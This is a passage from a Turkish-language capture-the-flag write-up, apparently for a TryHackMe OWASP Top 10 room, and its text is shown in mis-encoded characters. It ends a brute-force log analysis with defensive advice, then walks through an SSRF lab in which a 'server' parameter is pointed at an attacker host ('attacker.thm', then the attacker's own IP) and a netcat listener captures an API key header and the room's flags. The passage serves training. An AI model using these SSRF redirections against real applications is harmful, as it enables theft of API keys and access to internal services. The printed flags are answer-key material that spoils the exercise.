  - `root` kullanÄ±cÄ±sÄ±: 2019-03-21 21:08:30

- Bu, aynÄ± IP adresinden gelen ardÄ±ÅŸÄ±k baÅŸarÄ±sÄ±z giriÅŸ denemelerinin genellikle brute force saldÄ±rÄ±larÄ±nÄ±n tipik bir belirtisi olduÄŸunu gÃ¶sterir. Bir saldÄ±rgan, yaygÄ±n kullanÄ±cÄ± adlarÄ± (Ã¶rneÄŸin, `admin`, `administrator`, `root`) ile ÅŸifre tahmin etmeye Ã§alÄ±ÅŸÄ±yor olabilir. Brute force saldÄ±rÄ±larÄ± zaman alÄ±cÄ±dÄ±r ancak doÄŸru ÅŸifreyi bulana kadar devam ederler.

- Bu tÃ¼r bir saldÄ±rÄ±ya karÅŸÄ± Ã¶nlem almak iÃ§in ÅŸu adÄ±mlar Ã¶nerilebilir:
  1. **Hesap kilitleme mekanizmalarÄ±**: BaÅŸarÄ±sÄ±z giriÅŸ denemelerinin belirli bir sayÄ±ya ulaÅŸtÄ±ÄŸÄ±nda hesabÄ± geÃ§ici olarak kilitlemek.
  2. **CAPTCHA kullanÄ±mÄ±**: Otomatik giriÅŸ denemelerini engellemek iÃ§in CAPTCHA doÄŸrulamasÄ± eklemek.
  3. **GÃ¼Ã§lÃ¼ ÅŸifreler**: KullanÄ±cÄ±larÄ±n daha gÃ¼Ã§lÃ¼ ve karmaÅŸÄ±k ÅŸifreler kullanmalarÄ±nÄ± saÄŸlamak.
  4. **Ä°ki faktÃ¶rlÃ¼ kimlik doÄŸrulama (2FA)**: KullanÄ±cÄ±larÄ±n giriÅŸ yaparken bir ek doÄŸrulama katmanÄ± kullanmalarÄ±nÄ± saÄŸlamak.
  5. **IP engelleme veya rate limiting**: AÅŸÄ±rÄ± giriÅŸ denemeleri yapÄ±lan IP adreslerini engellemek veya sÄ±nÄ±rlamak.

## GÃ¶rev 22: ğŸ›‘ Server-Side Request Forgery (SSRF)

SSRF (Sunucu TaraflÄ± Ä°stek SahteciliÄŸi), bir saldÄ±rganÄ±n web uygulamasÄ±nÄ± kullanarak kendi adÄ±na istekte bulunmasÄ±nÄ± ve bu isteÄŸin iÃ§eriÄŸini kontrol etmesini saÄŸlayan bir gÃ¼venlik aÃ§Ä±ÄŸÄ±dÄ±r. Bu tÃ¼r aÃ§Ä±klar genellikle, web uygulamalarÄ±nÄ±n Ã¼Ã§Ã¼ncÃ¼ taraf servisleri kullanmasÄ± gerektiÄŸinde ortaya Ã§Ä±kar.

### **SSRF Nedir?**
Ã–rneÄŸin, bir web uygulamasÄ±nÄ±n mÃ¼ÅŸterilere SMS bildirimleri gÃ¶ndermek iÃ§in harici bir API kullandÄ±ÄŸÄ±nÄ± dÃ¼ÅŸÃ¼nelim. Bu iÅŸlem iÃ§in uygulama, SMS saÄŸlayÄ±cÄ±sÄ±na bir web isteÄŸi gÃ¶nderir. Ancak, SMS saÄŸlayÄ±cÄ±larÄ± her mesaj iÃ§in Ã¼cret talep ettiÄŸi iÃ§in, her istekte bir API anahtarÄ± (gizli anahtar) kullanÄ±lmasÄ±nÄ± zorunlu kÄ±lar. Bu anahtar, kimin faturalandÄ±rÄ±lacaÄŸÄ±nÄ± belirlemek iÃ§in gereklidir.

AÅŸaÄŸÄ±daki diyagram, bu sÃ¼recin nasÄ±l Ã§alÄ±ÅŸtÄ±ÄŸÄ±nÄ± gÃ¶stermektedir:

![SSRF](https://i.ibb.co/203GRS03/22-1.png)

Diyagrama dikkatlice baktÄ±ÄŸÄ±mÄ±zda, gÃ¼venlik aÃ§Ä±ÄŸÄ±nÄ±n nerede olduÄŸunu anlayabiliriz. Uygulama, kullanÄ±cÄ±larÄ±n **server** parametresini deÄŸiÅŸtirmesine izin vermektedir. EÄŸer bir saldÄ±rgan bu parametreyi deÄŸiÅŸtirirse, SMS isteÄŸi saldÄ±rganÄ±n kontrolÃ¼ndeki bir sunucuya yÃ¶nlendirilir. BÃ¶ylece, saldÄ±rgan API anahtarÄ±nÄ± ele geÃ§irerek SMS servisini kendi Ã§Ä±karÄ± iÃ§in kullanabilir.

Ã–rneÄŸin, saldÄ±rgan aÅŸaÄŸÄ±daki gibi bir istekte bulunabilir:

```
https://www.mysite.com/sms?server=attacker.thm&msg=ABC
```

Bu istek sonucunda, web uygulamasÄ± aÅŸaÄŸÄ±daki isteÄŸi yapacaktÄ±r:

```
https://attacker.thm/api/send?msg=ABC
```

SaldÄ±rgan, **Netcat** kullanarak bu isteÄŸin iÃ§eriÄŸini yakalayabilir:

```shell
user@attackbox$ nc -lvp 80
Listening on 0.0.0.0 80
Connection received on 10.10.1.236 43830
GET /:8087/public-docs/123.pdf HTTP/1.1
Host: 10.10.10.11
User-Agent: PycURL/7.45.1 libcurl/7.83.1 OpenSSL/1.1.1q zlib/1.2.12 brotli/1.0.9 nghttp2/1.47.0
Accept: */*
```

### **SSRF'nin Daha Tehlikeli KullanÄ±mlarÄ±**
Bu Ã¶rnek basit bir **SSRF** saldÄ±rÄ±sÄ±dÄ±r. Ancak, **SSRF** Ã§ok daha ciddi gÃ¼venlik tehditlerine yol aÃ§abilir:

- **Dahili AÄŸlarÄ± KeÅŸfetme:** Ã–zel IP adresleri ve aÃ§Ä±k portlarÄ± tespit edebilir.
- **GÃ¼venilir Sunucular ArasÄ±ndaki GÃ¼veni KÃ¶tÃ¼ye Kullanma:** Yetkisiz hizmetlere eriÅŸim saÄŸlayabilir.
- **Uzak Kod Ã‡alÄ±ÅŸtÄ±rma (RCE):** HTTP dÄ±ÅŸÄ±ndaki bazÄ± hizmetlerle etkileÅŸime geÃ§erek sistem Ã¼zerinde kod Ã§alÄ±ÅŸtÄ±rabilir.

### **Pratik Ã–rnek**
Åimdi bir uygulamada **SSRF** aÃ§Ä±ÄŸÄ±nÄ± nasÄ±l kullanabileceÄŸimizi gÃ¶relim.

1. **Makineye BaÄŸlanÄ±n:**  
  8087 portuna giderek web uygulamasÄ±na eriÅŸin.

2. **UygulamayÄ± Ä°nceleyin:**  
   SayfalarÄ± keÅŸfederek **admin panelini** bulun.

3. **EriÅŸim SaÄŸlayÄ±n:**  
   SorularÄ± takip ederek admin paneline eriÅŸim elde edin.

Bu adÄ±mlarÄ± takip ederek, **SSRF** aÃ§Ä±klarÄ±nÄ±n nasÄ±l Ã§alÄ±ÅŸtÄ±ÄŸÄ±nÄ± ve nasÄ±l kÃ¶tÃ¼ye kullanÄ±labileceÄŸini Ã¶ÄŸrenebilirsiniz.

### Bayrak Yakalamaca

#### 1. **Port 8087'ye GidiÅŸ ve CV Ä°ndirme Butonu**

Ä°lk olarak, **8087 numaralÄ± porta** eriÅŸtiÄŸimizde, bir **CV indirme butonu** gÃ¶rÃ¼yoruz. Bu butonun URL'sini incelediÄŸimizde, genellikle dÄ±ÅŸ bir sunucuya (host) baÄŸlantÄ± yapÄ±lmasÄ± gerektiÄŸini gÃ¶rÃ¼yoruz:

![Ekran](https://i.ibb.co/dx2fHDy/22-2.png)

**Ä°lgili URL:**
```
http://10.10.138.247:8087/download?server=secure-file-storage.com:8087&id=75482342
```

Bu URL, `secure-file-storage.com` hostuna baÄŸlanÄ±p dosya indirmeyi amaÃ§lÄ±yor. Ancak burada bize sunulan buton, bu isteÄŸi yÃ¶nlendirebilecek bir mekanizma barÄ±ndÄ±rÄ±yor.

#### 2. **Admin Paneline EriÅŸim**

Port 8087'de karÅŸÄ±mÄ±za Ã§Ä±kan bir diÄŸer ÅŸey ise bir **admin paneli**. Bu panelde tÄ±kladÄ±ÄŸÄ±mÄ±zda, bir uyarÄ± ile karÅŸÄ±laÅŸÄ±yoruz:

![Ekran](https://i.ibb.co/NdcLd932/22-3.png)

#### 3. **Lokal Host EriÅŸim UyarÄ±sÄ±**

Admin paneline tÄ±klanÄ±p URL'yi aÃ§mak istediÄŸimizde, karÅŸÄ±mÄ±za ÅŸu uyarÄ±yÄ± gÃ¶rÃ¼yoruz:

![Ekran](https://i.ibb.co/TqNtScQy/22-4.png)

**UyarÄ± mesajÄ±:**
```
Sadece lokal hosttan eriÅŸebilirsin
```

Bu uyarÄ±, yalnÄ±zca **localhost** (yerel makine) Ã¼zerinden eriÅŸilebilecek bir admin paneline iÅŸaret ediyor. Yani dÄ±ÅŸarÄ±dan bir baÄŸlantÄ± yapÄ±lmasÄ± engelleniyor. Bu tÃ¼r bir sÄ±nÄ±rlama, genellikle uygulamanÄ±n gÃ¼venliÄŸini artÄ±rmak amacÄ±yla yapÄ±lÄ±r.

#### 4. **Netcat ile Yerel Port AÃ§ma ve Ä°stek Dinleme**

Bununla birlikte, burada yapÄ±labilecek bir **manipÃ¼lasyon** var. URL parametrelerini deÄŸiÅŸtirerek, isteÄŸi kendi yerel makinemize yÃ¶nlendirebiliriz. Ã–rneÄŸin:

Ä°lk baÅŸta verilen URL:

```
http://10.10.138.247:8087/download?server=secure-file-storage.com:8087&id=75482342
```

**ManipÃ¼lasyon:** 

Bu URL'yi ÅŸu ÅŸekilde deÄŸiÅŸtiriyoruz:

```
http://10.10.138.247:8087/download?server=localhost:8087/admin%23&id=75482342
```

Burada yaptÄ±ÄŸÄ±mÄ±z ÅŸey, `server` parametresini `localhost:8087` olarak deÄŸiÅŸtiriyoruz. Bu ÅŸekilde, dosya indirme iÅŸlemi `localhost` Ã¼zerinden gerÃ§ekleÅŸecek ve admin paneline baÄŸlanmaya Ã§alÄ±ÅŸacak.

Åimdi, **netcat** kullanarak kendi bilgisayarÄ±mÄ±zda **8087 portunu dinliyoruz**. Bunun iÃ§in ÅŸu komutu kullanÄ±yoruz:

```bash
â”Œâ”€â”€(kaliã‰¿kali)-[~]
â””â”€$ nc -nvlp 8087
listening on [any] 8087 ...
```

Bu komut, yerel makinemizde **8087 numaralÄ± portu dinlemeye** baÅŸlar.

#### 5. **Yerel Port Dinleme (Netcat) ve Bayrak Ã‡Ä±kÄ±ÅŸÄ±**

**Netcat** dinlemede iken, **manipÃ¼le edilmiÅŸ URL**'yi tÄ±klÄ±yoruz. SonuÃ§ olarak, `localhost:8087` Ã¼zerinden bir istek yapÄ±lacak ve biz bu isteÄŸi **netcat** ile dinleyeceÄŸiz. Ä°stek baÅŸarÄ±yla geldikten sonra aÅŸaÄŸÄ±daki bayraÄŸÄ± gÃ¶rÃ¼yoruz:

![Ekran](https://i.ibb.co/dwYH31HK/22-7.png)

```
The flag is thm{c4n_i_haz_flagz_plz?}
```

BayraÄŸÄ± yakaladÄ±k: `thm{c4n_i_haz_flagz_plz?}`

Bu, **netcat** aracÄ±lÄ±ÄŸÄ±yla gelen veriyi dinleyerek elde ettiÄŸimiz ilk bayraktÄ±r.

#### 6. **Netcat ile Ä°steÄŸi GÃ¶rÃ¼ntÃ¼leme (BaÄŸlantÄ± ve Bayrak)**

EÄŸer **netcat** aracÄ±lÄ±ÄŸÄ±yla gelen isteÄŸi gÃ¶rmek istersek, URL'yi manipÃ¼le ederek **doÄŸrudan kendi IP adresimize yÃ¶nlendirebiliriz**. Bu sefer `server` parametresine kendi **IP adresimizi** gireceÄŸiz.

CV PDF'ini indirmek iÃ§in kullandÄ±ÄŸÄ±mÄ±z URL:

```
http://10.10.138.247:8087/download?server=localhost:8087/admin%23&id=75482342
```

ManipÃ¼le edilmiÅŸ URL:

```
http://10.10.138.247:8087/download?server=10.23.71.244:8087/admin%23&id=75482342
```

Burada, `10.23.71.244` IP adresini, yani **yerel makinemizin IP adresini** kullanÄ±yoruz.

**Netcat** ile dinlemeye devam edelim:

```bash
â”Œâ”€â”€(rootã‰¿kali)-[/home/kali]
â””â”€# nc -lvnp 8087
listening on [any] 8087 ...
```

Gelen istek ÅŸu ÅŸekilde gÃ¶rÃ¼nÃ¼yor:

![Ekran](https://i.ibb.co/mCRx90Z1/22-6.png)

```
connect to [10.23.71.244] from (UNKNOWN) [10.10.138.247] 46694
GET /admin HTTP/1.1
Host: 10.23.71.244:8087
User-Agent: PycURL/7.45.1 libcurl/7.83.1 OpenSSL/1.1.1q zlib/1.2.12 brotli/1.0.9 nghttp2/1.47.0
Accept: */*
X-API-KEY: THM{Hello_Im_just_an_API_key}
```

Burada dikkat edilmesi gereken birkaÃ§ ÅŸey var:

- Ä°stek, **`/admin`** yoluna yapÄ±lmÄ±ÅŸ.
- Ä°stek baÅŸlÄ±klarÄ±nda **`X-API-KEY`** parametresi var ve bu parametre, bir API anahtarÄ± iÃ§eriyor.
  
BayraÄŸÄ± yakaladÄ±k: `THM{Hello_Im_just_an_API_key}`

Bu, **netcat** ile dinlediÄŸimiz baÄŸlantÄ±dan elde ettiÄŸimiz ikinci bayraktÄ±r.

## Notlar

- Bu yazÄ±da, OWASP Top 10 2021 listesinde yer alan en yaygÄ±n ve kritik gÃ¼venlik aÃ§Ä±klarÄ±nÄ± ele aldÄ±m. Her bir gÃ¼venlik aÃ§Ä±ÄŸÄ±nÄ±n ne olduÄŸunu, nasÄ±l ortaya Ã§Ä±ktÄ±ÄŸÄ±nÄ± ve nasÄ±l istismar edilebileceÄŸini Ã¶rneklerle aÃ§Ä±kladÄ±m.

- AyrÄ±ca, bu gÃ¼venlik aÃ§Ä±klarÄ±na karÅŸÄ± alÄ±nabilecek Ã¶nlemleri de birazcÄ±k gÃ¶sterdim. GÃ¼venlik aÃ§Ä±klarÄ±nÄ± anlamak ve bunlara karÅŸÄ± Ã¶nlem almak, web uygulamalarÄ±nÄ±n gÃ¼venliÄŸini saÄŸlamak iÃ§in kritik Ã¶neme sahiptir.

- Bu rehberin, gÃ¼venlik uzmanlarÄ± ve geliÅŸtiriciler iÃ§in faydalÄ± bir kaynak olmasÄ±nÄ± umuyorum. UnutmayÄ±n, gÃ¼venlik sÃ¼rekli bir sÃ¼reÃ§tir ve her zaman gÃ¼ncel kalmak Ã¶nemlidir. O programÄ±nÄ± gÃ¼ncelle karÅŸim. SÄ±KÄ±NtI OlaR!

- Seviyeleri bitirdikten sonra, gidip video Ã§ekin, not alÄ±n, gidip siz de makale ÅŸeklinde yazÄ±n. Benden daha da gÃ¼zelini yapÄ±n. Daha da aÃ§Ä±klayÄ±cÄ± olun. BunlarÄ± yapmayacaksanÄ±z gidin kafanÄ±zÄ± Ã§Ã¶p kutusuna sokun daha iyi.

- Yeni yazÄ±da ya da projede gÃ¶rÃ¼ÅŸmek dileÄŸiyle, esenlikler...
